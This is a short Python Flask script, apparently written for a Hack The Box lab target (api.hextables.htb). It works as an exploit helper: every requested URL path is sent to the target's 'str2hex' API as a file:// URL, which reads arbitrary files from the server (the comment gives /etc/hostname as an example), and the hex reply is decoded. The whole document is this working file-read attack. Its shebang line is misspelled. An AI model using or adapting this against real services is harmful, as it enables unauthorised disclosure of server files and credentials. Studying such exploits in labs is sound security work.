````python
#/usr/bin/env pyython3

from flask import Flask 
import requests, json

app = Flask(__name__)

# http://localhost:5000/etc/hostname

@app.route("/<path:file>")
def get_file(file):

    post_data = {
        'action': 'str2hex',
        'file_url': f"file://{file}"
    }

    response = requests.post("http://api.hextables.htb/v3/tools/string/index.php", json=post_data)

    return bytes.fromhex(json.loads(response.text)["data"])

if __name__ == '__main__':

    app.run(debug=True)
    ````
    